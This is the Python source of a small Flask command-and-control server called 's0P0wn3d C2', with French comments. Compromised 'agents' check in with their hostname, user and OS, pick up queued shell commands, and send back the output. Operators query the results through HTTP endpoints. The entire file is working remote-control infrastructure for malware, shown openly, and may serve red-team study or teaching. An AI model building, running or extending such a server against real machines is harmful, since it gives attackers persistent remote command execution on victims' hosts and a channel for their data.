#!/usr/bin/env python3
"""
s0P0wn3d C2 - Server
"""

from flask import Flask, request, jsonify
from datetime import datetime
import logging
import sys

app = Flask(__name__)

# Configuration du logging Flask (mode silencieux par défaut)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Stockage en mémoire
agents = {}
commands_queue = {}
results = {}

# Mode verbose (activé avec --verbose)
VERBOSE = "--verbose" in sys.argv


def vprint(message):
    """Print seulement en mode verbose"""
    if VERBOSE:
        print(message)


def send_command(agent_id, cmd_type, cmd_data):
    """
    Ajoute une commande dans la queue d'un agent.

    Args:
        agent_id: ID de l'agent cible
        cmd_type: Type de commande (ex: "shell")
        cmd_data: Données de la commande (ex: "whoami")
    """
    if agent_id not in commands_queue:
        commands_queue[agent_id] = []

    commands_queue[agent_id].append({
        "type": cmd_type,
        "command": cmd_data
    })

    vprint(f"[QUEUE] Added for {agent_id}: {cmd_type} -> {cmd_data}")


@app.route("/")
def hello():
    """Endpoint de test"""
    return jsonify({"status": "ok", "message": "s0P0wn3d C2 Server"})


@app.route("/command", methods=["POST"])
def add_command():
    """
    Ajoute une commande dans la queue d'un agent.

    Exemple:
    curl -X POST http://localhost:8443/command \
      -H "Content-Type: application/json" \
      -d '{"agent_id":"TEST_C","type":"shell","command":"whoami"}'
    """
    data = request.get_json()

    agent_id = data.get("agent_id")
    cmd_type = data.get("type")
    cmd_data = data.get("command")

    if not agent_id or not cmd_type or not cmd_data:
        return jsonify({
            "status": "error",
            "message": "Missing fields: agent_id, type, or command"
        }), 400

    send_command(agent_id, cmd_type, cmd_data)

    return jsonify({
        "status": "ok",
        "message": f"Command queued for {agent_id}"
    })


@app.route("/beacon", methods=["POST"])
def beacon():
    """
    Endpoint pour les beacons des agents.
    L'agent envoie ses infos et reçoit les commandes en attente.
    """
    data = request.get_json()

    agent_id = data.get("agent_id", "UNKNOWN")
    hostname = data.get("hostname", "UNKNOWN")
    username = data.get("username", "UNKNOWN")
    os_info = data.get("os", "UNKNOWN")

    # Enregistrer l'agent
    agents[agent_id] = {
        "hostname": hostname,
        "username": username,
        "os": os_info,
        "last_seen": datetime.now().isoformat()
    }

    # Récupérer les commandes en attente
    pending_commands = commands_queue.get(agent_id, [])
    commands_queue[agent_id] = []

    vprint(f"[BEACON] {agent_id} ({hostname}) | Commands: {len(pending_commands)}")

    if pending_commands:
        return jsonify({
            "status": "ok",
            "command": pending_commands[0]["command"]
        })
    else:
        return jsonify({
            "status": "ok"
        })


@app.route("/agents", methods=["GET"])
def list_agents():
    """Liste tous les agents enregistrés"""
    return jsonify({
        "total": len(agents),
        "agents": agents
    })


@app.route("/result", methods=["POST"])
def receive_result():
    """Reçoit les résultats d'exécution de commandes."""
    data = request.get_json()

    agent_id = data.get("agent_id")
    command = data.get("command")
    output = data.get("output")
    timestamp = data.get("timestamp")

    if agent_id not in results:
        results[agent_id] = []

    results[agent_id].append({
        "command": command,
        "output": output,
        "timestamp": timestamp
    })

    # Afficher SEULEMENT en mode verbose
    if VERBOSE:
        print(f"\n{'=' * 70}")
        print(f"[+] RESULT from {agent_id}")
        print(f"[>] Command: {command}")
        print(f"[<] Output:")
        print(output)
        print(f"{'=' * 70}\n")

    return jsonify({"status": "ok"})


@app.route("/results/<agent_id>", methods=["GET"])
def get_results(agent_id):
    """
    Récupère tous les résultats d'un agent.
    """
    if agent_id not in results:
        return jsonify({
            "status": "error",
            "message": f"No results found for {agent_id}"
        }), 404

    return jsonify({
        "status": "ok",
        "agent_id": agent_id,
        "count": len(results[agent_id]),
        "results": results[agent_id]
    })


if __name__ == "__main__":
    print("=" * 70)
    print("s0P0wn3d C2 Server")
    print("=" * 70)
    print(f"[*] Listening on 0.0.0.0:8443")
    print(f"[*] Verbose mode: {'ON' if VERBOSE else 'OFF'}")
    print(f"[*] Start with --verbose for detailed logs")
    print("=" * 70 + "\n")

    app.run(
        host="0.0.0.0",
        port=8443,
        debug=False,
        threaded=True
    )